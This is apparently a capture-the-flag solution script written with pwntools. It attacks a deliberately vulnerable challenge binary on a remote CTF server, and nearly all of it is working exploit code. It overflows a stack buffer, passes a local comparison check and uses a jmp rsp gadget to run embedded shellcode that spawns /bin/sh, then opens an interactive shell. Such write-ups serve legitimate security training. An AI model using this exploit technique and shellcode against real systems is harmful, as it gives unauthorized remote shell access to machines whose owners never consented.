from pwn import *

p = remote("challs.xmas.htsp.ro", 2000)

context.arch = "amd64"
chalELF = ELF("./chall")

"""
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
"""


"""
0x0000000000400743: pop rdi; ret; 
0x0000000000400741: pop rsi; pop r15; ret;
"""

pop_rdi_ret = p64(0x0000000000400743)

jmp_rsp = p64(0x000000000040067f)

tiny_bin_sh = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

buf = b''
buf += asm("""
    nop
    nop
    nop
""") + tiny_bin_sh


buf = buf.ljust(cyclic_find("aamaaanaaaoa"), b"A")
buf += p16(0x0E4FF) # another lame cmp against local variable
buf += cyclic(cyclic_find("caaadaaa"))




# leak libc, return to main again
#buf += p64(chalELF.got['puts'])
#buf += pop_rdi_ret
buf += jmp_rsp
# we have like 6 bytes to do this lol
buf += asm(f"""
    sub rsp, {len(buf)}
    call rsp
""")


p.sendline(buf)



p.interactive()